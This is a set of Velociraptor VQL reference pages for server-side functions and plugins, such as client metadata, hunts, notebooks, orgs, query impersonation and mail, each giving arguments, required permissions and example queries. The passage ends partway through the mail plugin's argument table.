title: client_set_metadata
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## client_set_metadata
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id||string (required)
metadata|A dict containing metadata. If not specified we use kwargs.|ordereddict.Dict

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_CLIENT</span>
<span class="permission_list linkcolour label label-important">SERVER_ADMIN</span>

### Description

Sets client metadata.

Client metadata is a set of free form key-value pairs, i.e. a dict.

When updating metadata the result is the same as adding 2 dicts.
For existing keys, the value is overwritten.

Setting a metadata key with a `NULL` value deletes that entry.

### Example

```vql
SELECT client_set_metadata(client_id=client_id, metadata=dict(department="Lab02"))
FROM clients()
WHERE os_info.hostname =~ "TRAINING"
```

### See also

- [client_metadata]({{< ref "/vql_reference/server/client_metadata/" >}}):
  Returns client metadata from the datastore.



---END OF FILE---

======
FILE: /content/vql_reference/server/rm_client_monitoring/_index.md
======
---
title: rm_client_monitoring
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## rm_client_monitoring
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
artifact|The name of the artifact to remove from the event table|string (required)
label|Remove the artifact from this label group (default the 'all'  group)|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_CLIENT</span>

### Description

Remove an artifact from the client monitoring table.


---END OF FILE---

======
FILE: /content/vql_reference/server/clients/_index.md
======
---
title: clients
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## clients
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
search|Client search string. Can have the following prefixes: 'label:', 'host:'|string
client_id||string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Returns client info for one or more clients from the datastore.

This plugin is typically used when needing to iterate of the list of
clients.

The `search` argument allows search expressions analogous to those in the
GUI's client search bar.

The information returned for each client is the same as is returned by the
`client_info()` function. If you are retrieving information for a specific
client then you may want to consider using that instead.

### See also

- [client_info]({{< ref "/vql_reference/server/client_info/" >}}): Returns
  client info for a specific client from the datastore.



---END OF FILE---

======
FILE: /content/vql_reference/server/create_notebook_download/_index.md
======
---
title: create_notebook_download
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## create_notebook_download
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
notebook_id|Notebook ID to export.|string (required)
filename|The name of the export. If not set this will be named according to the notebook id and timestamp|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">PREPARE_RESULTS</span>

### Description

Creates a notebook export zip file.


---END OF FILE---

======
FILE: /content/vql_reference/server/timeline_add/_index.md
======
---
title: timeline_add
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## timeline_add
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
timeline|Supertimeline to add to. If a super timeline does not exist, creates a new one.|string (required)
name|Name/Id of child timeline to add.|string (required)
query|Run this query to generate the timeline.|StoredQuery (required)
key|The column representing the time to key off.|string (required)
message_column|The column representing the message.|string
ts_desc_column|The column representing the timestamp description.|string
notebook_id|The notebook ID the timeline is stored in.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Add a new query to a timeline.


---END OF FILE---

======
FILE: /content/vql_reference/server/favorites_save/_index.md
======
---
title: favorites_save
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## favorites_save
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
name|A name for this collection template.|string (required)
description|A description for the template.|string
specs|The collection request spec that will be saved. We use this to create the new collection.|LazyExpr (required)
type|The type of favorite.|string (required)

### Description

Save a collection into the favorites.

Velociraptor allows the user to save a collection into their
"Favorite" list. This allows them to quickly and easily pick a
previously used collection.

This VQL function provides an interface for this functionality.

### Notes

A favorite belongs to the calling user - this function will
update the favorite for the calling user only.



---END OF FILE---

======
FILE: /content/vql_reference/server/org/_index.md
======
---
title: org
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## org
<span class='vql_type label label-warning pull-right page-header'>Function</span>


### Description

Return the details of the current org.


---END OF FILE---

======
FILE: /content/vql_reference/server/artifact_delete/_index.md
======
---
title: artifact_delete
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## artifact_delete
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
name|The Artifact to delete|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">ARTIFACT_WRITER</span>
<span class="permission_list linkcolour label label-important">SERVER_ARTIFACT_WRITER</span>

### Description

Deletes an artifact from the global repository.


---END OF FILE---

======
FILE: /content/vql_reference/server/flow_logs/_index.md
======
---
title: flow_logs
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## flow_logs
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
flow_id|The flow id to read.|string (required)
client_id|The client id to extract|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Retrieve the query logs of a flow.


---END OF FILE---

======
FILE: /content/vql_reference/server/org_create/_index.md
======
---
title: org_create
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## org_create
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
name|The name of the org.|string (required)
org_id|An ID for the new org (if not set use a random ID).|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">ORG_ADMIN</span>

### Description

Creates a new organization.


---END OF FILE---

======
FILE: /content/vql_reference/server/create_hunt_download/_index.md
======
---
title: create_hunt_download
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## create_hunt_download
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
hunt_id|Hunt ID to export.|string (required)
only_combined|If set we only export combined results.|bool
wait|If set we wait for the download to complete before returning.|bool
format|Format to export (csv,json) defaults to both.|string
base|Base filename to write to.|string
password|An optional password to encrypt the collection zip.|string
expand_sparse|If set we expand sparse files in the archive.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">PREPARE_RESULTS</span>

### Description

Creates a download pack for a hunt.

This function initiates the download creation process for a
hunt. It is equivalent to the GUI functionality allowing to
"Download Results" from the Hunts Overview page.

Using the `wait` parameter you can wait for the download to
complete or just kick it off asynchronously.



---END OF FILE---

======
FILE: /content/vql_reference/server/uploads/_index.md
======
---
title: uploads
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## uploads
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id|The client id to extract|string
flow_id|A flow ID (client or server artifacts)|string
hunt_id|A hunt ID|string
notebook_id|A notebook ID|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Retrieve information about a flow's uploads.


---END OF FILE---

======
FILE: /content/vql_reference/server/inventory_get/_index.md
======
---
title: inventory_get
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## inventory_get
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
tool||string (required)
version||string
probe|If specified we only probe the tool definition without materializing|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">SERVER_ADMIN</span>

### Description

Get tool info from inventory service.


---END OF FILE---

======
FILE: /content/vql_reference/server/notebook_get/_index.md
======
---
title: notebook_get
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## notebook_get
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
notebook_id|The id of the notebook to fetch|string (required)
verbose|Include more information|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Get a notebook.


---END OF FILE---

======
FILE: /content/vql_reference/server/killkillkill/_index.md
======
---
title: killkillkill
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## killkillkill
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id||string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Sends a kill message to the client and forces a restart - this is very aggressive!



---END OF FILE---

======
FILE: /content/vql_reference/server/notebook_create/_index.md
======
---
title: notebook_create
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## notebook_create
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
name|The name of the notebook|string
description|The description of the notebook|string
collaborators|A list of users to share the notebook with.|list of string
public|If set the notebook will be public.|bool
artifacts|A list of NOTEBOOK artifacts to create the notebook with (Notebooks.Default)|list of string
env|An environment to initialize the notebook with|ordereddict.Dict

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>

### Description

Create a new notebook.


---END OF FILE---

======
FILE: /content/vql_reference/server/upload_directory/_index.md
======
---
title: upload_directory
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## upload_directory
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|The file to upload|OSPath (required)
name|Filename to be stored within the output directory|OSPath
accessor|The accessor to use|string
output|An output directory to store files in.|string (required)
mtime|Modified time to set the output file.|Any
atime|Access time to set the output file.|Any
ctime|Change time to set the output file.|Any
btime|Birth time to set the output file.|Any

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>

### Description

Upload a file to an upload directory. The final filename will be
the output directory path followed by the filename path.



---END OF FILE---

======
FILE: /content/vql_reference/server/artifact_set_metadata/_index.md
======
---
title: artifact_set_metadata
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## artifact_set_metadata
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
name|The Artifact to update|string (required)
hidden|Set to true make the artifact hidden in the GUI, false to make it visible again.|bool
basic|Set to true make the artifact a 'basic' artifact. This allows users with the COLLECT_BASIC permission able to collect it.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">ARTIFACT_WRITER</span>
<span class="permission_list linkcolour label label-important">SERVER_ARTIFACT_WRITER</span>

### Description

Sets metadata about the artifact.

This VQL function is used to clean up the artifact search screen
and guide users to assist with investigations.

Velociraptor comes with a lot of built in artifacts which may be
confusing to some users and in specialized deployments it may be
preferable to guide users into a small subset of artifacts and
hide the rest.

For example, say you have a set of custom artifacts that you only
want to show. Then I would add a special keyword to their
description (for example a company name - say "Written by ACME
inc"). Then a query like this will hide the others:

```vql
SELECT name, artifact_set_metadata(name=name, hidden=TRUE)
FROM artifact_definitions() WHERE NOT description =~ "ACME"
```



---END OF FILE---

======
FILE: /content/vql_reference/server/server_set_metadata/_index.md
======
---
title: server_set_metadata
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## server_set_metadata
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
metadata|A dict containing metadata. If not specified we use kwargs.|ordereddict.Dict

### Description

Sets server metadata. Server metadata is a set of free form
key/value data, usually used for configuration of artifacts.

For existing keys, the value is overwritten. Setting a metadata
key with a `NULL` value deletes that entry.

### Example

```vql
SELECT server_set_metadata(`Slack Token`="X12233")
FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/server/hunt_delete/_index.md
======
---
title: hunt_delete
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## hunt_delete
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
hunt_id||string (required)
really_do_it||bool
workers|Delete with this many workers (default 2)|int64
archive|Set this to only archive the hunt - it will still be accessible but will be hidden from the GUI|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">SERVER_ADMIN</span>

### Description

Delete a hunt. 


---END OF FILE---

======
FILE: /content/vql_reference/server/add_client_monitoring/_index.md
======
---
title: add_client_monitoring
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## add_client_monitoring
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
artifact|The name of the artifact to add|string (required)
parameters|A dict of artifact parameters|LazyExpr
label|Add the artifact to this label group (default all)|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_CLIENT</span>

### Description

Adds a new artifact to the client monitoring table.


---END OF FILE---

======
FILE: /content/vql_reference/server/user_options/_index.md
======
---
title: user_options
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## user_options
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
user|The user to create or update.|string (required)
theme|Set the user's theme.|string
timezone|Set the user's timezone.|string
lang|Set the user's language.|string
org|Set the user's default org id.|string
links|Set the user's default links. This should be a list of dicts with columns: type, text, url, icon_url, new_tab, encode, parameter, method, disabled.|StoredQuery
default_password|Set the user's default password for Zip Exports.|string

### Description

Update and read the user GUI options

### Example

The following will set the user language to French, dark
theme and add a sidebar link named Foobar. The default password
for zip exports will also be set to `foobar`.

```vql
SELECT user_options(user=whoami(),
       lang="fr",
       theme="veloci-dark",
       links=[dict(
          text="Foobar",
          url="https://www.google.com",
          type="sidebar",
          new_tab=TRUE), ],
        default_password="foobar")
FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/server/orgs/_index.md
======
---
title: orgs
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## orgs
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

Retrieve the list of orgs on this server.


---END OF FILE---

======
FILE: /content/vql_reference/server/backup/_index.md
======
---
title: backup
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## backup
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
name|The name of the backup file.|string (required)

### Description

Generates a backup file.


---END OF FILE---

======
FILE: /content/vql_reference/server/create_flow_download/_index.md
======
---
title: create_flow_download
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## create_flow_download
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id|Client ID to export.|string (required)
flow_id|The flow id to export.|string (required)
wait|If set we wait for the download to complete before returning.|bool
type|Type of download to create (deprecated Ignored).|string
template|Report template to use (deprecated Ignored).|string
password|An optional password to encrypt the collection zip.|string
format|Format to export (csv,json,csv_only) defaults to both.|string
expand_sparse|If set we expand sparse files in the archive.|bool
name|If specified we call the file this name otherwise we generate name based on flow id.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">PREPARE_RESULTS</span>

### Description

Creates a download pack for the flow.

This function initiates the download creation process for a
flow. It is equivalent to the GUI functionality allowing to
"Download Results" from the Flows Overview page.

Using the `wait` parameter you can wait for the download to
complete or just kick it off asynchronously.



---END OF FILE---

======
FILE: /content/vql_reference/server/file_store/_index.md
======
---
title: file_store
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## file_store
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|A VFS path to convert|LazyExpr (required)

### Description

Resolves file store paths into full filesystem paths.

This function is only available on the server. It can be used to
find the backing file behind a filestore path so it can be passed
on to an external program.

Velociraptor uses the concept of a Virtual File System to manage the
information about clients etc. The VFS path is a path into the file
store. Of course ultimately (at least in the current implementation)
the file store is storing files on disk, but the disk filename is not
necessarily the same as the VFS path (for example non-representable
characters are escaped).

You can use the `file_store()` function to return the real file path
on disk. This probably only makes sense for VQL queries running on the
server which can independently open the file.

In future the file store may be abstracted (e.g. files may not be
locally stored at all) and this function may stop working.



---END OF FILE---

======
FILE: /content/vql_reference/server/favorites_delete/_index.md
======
---
title: favorites_delete
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## favorites_delete
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
name|A name for this collection template.|string (required)
type|The type of favorite.|string (required)

### Description

Delete a favorite.


---END OF FILE---

======
FILE: /content/vql_reference/server/set_client_monitoring/_index.md
======
---
title: set_client_monitoring
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## set_client_monitoring
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
value|The Value to set|Any (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_CLIENT</span>

### Description

Sets the current client monitoring state.


---END OF FILE---

======
FILE: /content/vql_reference/server/server_metadata/_index.md
======
---
title: server_metadata
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## server_metadata
<span class='vql_type label label-warning pull-right page-header'>Function</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">SERVER_ADMIN</span>

### Description

Returns server metadata from the datastore. Server metadata is a
set of free form key/value data



---END OF FILE---

======
FILE: /content/vql_reference/server/monitoring/_index.md
======
---
title: monitoring
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## monitoring
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id|The client id to extract|string (required)
artifact|The name of the event artifact to read|string (required)
source|An optional named source within the artifact|string
start_time|Start return events from this date (for event sources)|Any
end_time|Stop end events reach this time (event sources).|Any
start_row|Start reading the result set from this row|int64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Extract monitoring log from a client.



---END OF FILE---

======
FILE: /content/vql_reference/server/inventory_add/_index.md
======
---
title: inventory_add
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## inventory_add
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
tool||string (required)
serve_locally||bool
url||string
hash||string
filename|The name of the file on the endpoint|string
version||string
file|An optional file to upload|OSPath
accessor|The accessor to use to read the file.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">SERVER_ADMIN</span>

### Description

Add or reconfigure a tool into the inventory.

Note that if you provide a file to override the tool it must be
readable by the server (so the file must reside on the server or
be accessible over a network share).



---END OF FILE---

======
FILE: /content/vql_reference/server/hunt_add/_index.md
======
---
title: hunt_add
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## hunt_add
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id||string (required)
hunt_id||string (required)
flow_id|If a flow id is specified we do not create a new flow, but instead add this flow_id to the hunt.|string
relaunch|If specified we relaunch the hunt on this client again.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">START_HUNT</span>

### Description

Assign a client to a hunt.

This function allows a client to be added to a hunt. The client
will be immediately scheduled and the results will be added to the
hunt. Clients are added to a hunt regardless of any hunt
conditions, or even if the hunt is stopped.

You can use this function to manually add clients to selected
hunts for example after being triaged or post processed to
identify the clients of interest.

An alternative method is to create a hunt that only targets
a specific label and then just assign the label to specific
clients.

### Notes

#### Adding an existing flow to a hunt.

If a flow_id is specified, this function will just immediately add
the collection to the hunt, without scheduling a new
collection. The results of this flow will be visible when post
processing the hunt, exporting the hunt etc.

This is useful to redo a collection in a hunt - for example, if
some collections in the hunt expired or were cancelled you can
manually re-run these collections and then when successful re-add
them to the hunt.



---END OF FILE---

======
FILE: /content/vql_reference/server/user_delete/_index.md
======
---
title: user_delete
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## user_delete
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
user|The user to delete.|string (required)
orgs|If set we only delete from these orgs, otherwise we delete from the current org.|list of string
really_do_it|If not specified, just show what user will be removed|bool

### Description

Deletes a user from the server.


---END OF FILE---

======
FILE: /content/vql_reference/server/vfs_ls/_index.md
======
---
title: vfs_ls
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## vfs_ls
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|The directory to refresh.|OSPath
components|Alternatively a list of path components can be given.|list of string
accessor|An accessor to use.|string
depth|Depth of directory to list (default 0).|int64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

List directory and build a VFS object.

This plugin is probably only useful as part of the
System.VFS.ListDirectory artifact.



---END OF FILE---

======
FILE: /content/vql_reference/server/org_delete/_index.md
======
---
title: org_delete
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## org_delete
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
org|The org ID to delete.|string (required)
really_do_it|If not specified, just show what org will be removed|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">ORG_ADMIN</span>

### Description

Deletes an Org from the server.


---END OF FILE---

======
FILE: /content/vql_reference/server/import/_index.md
======
---
title: import
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## import
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
artifact|The Artifact to import|string (required)

### Description

Imports an artifact into the current scope. This only works in notebooks!


---END OF FILE---

======
FILE: /content/vql_reference/server/query/_index.md
======
---
title: query
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## query
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|A VQL Query to parse and execute.|Any (required)
env|A dict of args to insert into the scope.|ordereddict.Dict
copy_env|A list of variables in the current scope that will be copied into the new scope.|list of string
cpu_limit|Average CPU usage in percent of a core.|float64
iops_limit|Average IOPs to target.|float64
timeout|Cancel the query after this many seconds|float64
progress_timeout|If no progress is detected in this many seconds, we terminate the query and output debugging information|float64
org_id|If specified, the query will run in the specified org space (Use 'root' to refer to the root org)|string
runas|If specified, the query will run as the specified user|string
inherit|If specified we inherit the scope instead of building a new one.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">IMPERSONATION</span>

### Description

Evaluate a VQL query.

This plugin is useful for evaluating a query in a different
environment or context, or turning a string into a query.

The query provided by the `query` parameter can be a string, in
which case it is parsed as a VQL expression, or a VQL expression.

When we evaluate the query, it runs in an isolated scope. This
means that usually variables defined outside the query plugin are
not visible inside the query.

You can use the `env` parameter to specify a dict of variables
that will be visible inside the query. This allows to control how
variables are shared between the new isolated scope and the
existing scope outside the query.

Below we describe a few quirks that users might encounter with
this plugin.

### Custom artifacts

The isolated scope does not contain any artifacts by
default. Usually artifacts are accessible from VQL using the
`Artifact` plugin, for example the following accesses the
`Custom.VQL` artifact:

```vql
SELECT * FROM Artifact.Custom.VQL()
```

This will not work in the query plugin because the scope is
isolated. If you want to use the `Artifact` plugin in the new
scope you need to pass it through the `env` variable:

```vql
SELECT * FROM query(query={
      SELECT * FROM Artifact.Custom.VQL()
}, env=dict(artifact=Artifact))
```

### Remapping rules

When using the `remap()` function to install a new remapping
configuration, the remapping applies on the current scope and
affect all further VQL statements after the `remap()` function is
evaluated. This means that it is impossible to revoke the
remapping configuration and restore the scope.

For this reason we recommend that remapping rules be applied
inside an isolated `query()` scope. This way the remapping will
only apply for the like of the `query()` plugin invocation.

### Using LET statements inside the query

The `query` parameter can specify a VQL statement or a string
which will be parsed into a VQL statement. If you use a VQL
statement it is no possible to use a LET expression (since LET is
a separate statement). So this is not valid VQL syntax:

```vql
SELECT * FROM query(query={
  LET Foo(X) = ....
  SELECT * FROM Foo(X=1)
})
```

You can define the LET statements outside the query block and pass them in:
```vql
LET Foo(X) = ....

SELECT * FROM query(query={
  SELECT * FROM Foo(X=1)
}, env=dict(Foo=Foo))
```

Or declare the VQL block as a string;
SELECT * FROM query(query='''
  LET Foo(X) = ....
  SELECT * FROM Foo(X=1)
''')
```

### Running a query in a different org

Normally a VQL query runs in the org context in which it was
started. However sometimes it is useful to run in different
context. The `query()` plugin allows you to execute the query in
another scope context created within a different org.

To do this your user account must be sufficient permissions in the
target org (The query will use the user's ACL permissions token
for the target org).

For example the following query lists all the clients from all orgs:

```vql
SELECT *
FROM foreach(row={
   SELECT OrgId
   FROM orgs()
},  query={
   SELECT *, OrgId
   FROM query(query={ SELECT client_id FROM clients() }, org_id=OrgId)
})
```

### Running as a different user

You can specify a different user to run the VQL. This will load
the other user's ACL token and username (basically this acts like
the Linux `sudo` command).

You need to have the IMPERSONATION ACL permission to be able to do
this (Usually only admins have it). This permission is equivalent
to administrator because a user with this permission can become
any user they want including the administrator.



---END OF FILE---

======
FILE: /content/vql_reference/server/client_info/_index.md
======
---
title: client_info
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## client_info
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id||string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Returns client info (like the fqdn) for a specific client from the
datastore.

You can use this function to enrich information about clients in VQL output.

Velociraptor maintains basic information about the client in the data store,
such as its hostname, OS etc. This function queries the internal in-memory
database so it is very fast and suitable to be called frequently on each
row.

### Example

**1. Enriching hostnames**

Internally, Velociraptor uses client id to uniquely identify the client. But
often we want to provide a hostname as well. In the below we look at
collection output from the `source()` plugin and add an additional Hostname
column by resolving the client id on each row to its hostname.

```vql
SELECT *,
   client_info(client_id=client_id).os_info.hostname AS Hostname
FROM source()
```
### See also

- [clients]({{< ref "/vql_reference/server/clients/" >}}): Returns client
  info for one or more clients from the datastore.



---END OF FILE---

======
FILE: /content/vql_reference/server/notebook_update_cell/_index.md
======
---
title: notebook_update_cell
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## notebook_update_cell
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
notebook_id|The id of the notebook to update|string (required)
cell_id|The cell of the notebook to update. If this is empty we add a new cell to the notebook|string
type|Set the type of the cell if needed (markdown or vql).|string
input|The new cell content.|string (required)
output|If this is set, we do not calculate the cell but set this as the rendered output.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>

### Description

Update a notebook cell.


---END OF FILE---

======
FILE: /content/vql_reference/server/monitoring_logs/_index.md
======
---
title: monitoring_logs
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## monitoring_logs
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
client_id|The client id to extract|string (required)
artifact|The name of the artifact collection to fetch|string (required)
source|An optional named source within the artifact|string
start_time|Start return events from this date (for event sources)|Any
end_time|Stop end events reach this time (event sources).|Any

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">READ_RESULTS</span>

### Description

Retrieve log messages from client event monitoring for the specified client id and artifact


---END OF FILE---

======
FILE: /content/vql_reference/server/file_store_delete/_index.md
======
---
title: file_store_delete
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## file_store_delete
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|A VFS path to remove|LazyExpr (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">SERVER_ADMIN</span>

### Description

Delete file store paths.



---END OF FILE---

======
FILE: /content/vql_reference/server/mail/_index.md
======
---
title: mail
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## mail
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
to|Recipient of the mail|list of string (required)
from|The from email address.|string
cc|A cc for the mail|list of string
subject|The subject.|string
body|The body of the mail.|string (required)
period|How long to wait before sending the next mail - help to throttle mails.|int64
server_port|The SMTP server port to use (default 587).|uint64
server|The SMTP server to use (if not specified we try the config file).|string
auth_username|The SMTP username we authenticate to the server.|string
auth_password|The SMTP username password we use to authenticate to the server.|string
skip_verify|Skip SSL verification(default: False).|bool
root_ca|As a better alternative to disable_ssl_security, allows root ca certs to be added here.|string
